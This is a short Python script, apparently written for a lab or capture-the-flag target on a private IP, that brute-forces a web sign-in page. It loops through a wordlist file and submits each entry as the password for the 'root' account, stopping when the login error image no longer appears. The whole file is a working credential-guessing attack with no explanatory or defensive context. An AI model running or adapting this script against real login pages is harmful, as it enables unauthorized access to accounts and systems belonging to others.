import requests
import re

def brute_force_signin():
    i = 1

    error_message = "WrongAnswer.gif"
    with open('john.txt') as password_collections:
        for string in password_collections.readlines():
            
            string = string.strip()
            
            parameters = dict(page='signin',
                    username='root',
                    password=string,
                    Login='Login')

            result = requests.get('http://192.168.56.101/?page=signin', params=parameters)
            if error_message not in str(result.content) :
                print("Password is \"" + string + '\"')
                exit()
            else:
                print('attempt number ' + str(i))
            i = i + 1


brute_force_signin()
